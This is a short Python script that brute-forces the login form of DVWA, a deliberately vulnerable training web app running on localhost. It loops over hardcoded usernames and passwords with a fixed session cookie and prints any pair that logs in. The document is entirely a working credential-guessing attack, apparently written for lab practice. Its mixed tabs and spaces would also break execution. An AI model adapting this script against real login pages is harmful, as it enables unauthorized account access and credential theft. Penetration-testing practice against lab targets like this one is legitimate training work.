#!/usr/bin/python
import urllib3
http = urllib3.PoolManager()
users = ("usuario1","admin", "usuario2", "usuario3")
passwords = ("password1","password", "password2", "password3", "password4", "password5", "password6", "password7")

for user in users:
    for password in passwords:
        url = "http://localhost/dvwa/vulnerabilities/brute/?username=%s&password=%s&Login=Login#" %(user, password)
	head = {"Cookie":"security=low; PHPSESSID=ec11kdhmhma7gevprnu7tjacd2"}
    	r = http.request('GET', url, headers=head)
	html = r.data
        if "Username and/or password incorrect." not in html:
            print "Login ==> %s : %s" %(user, password)


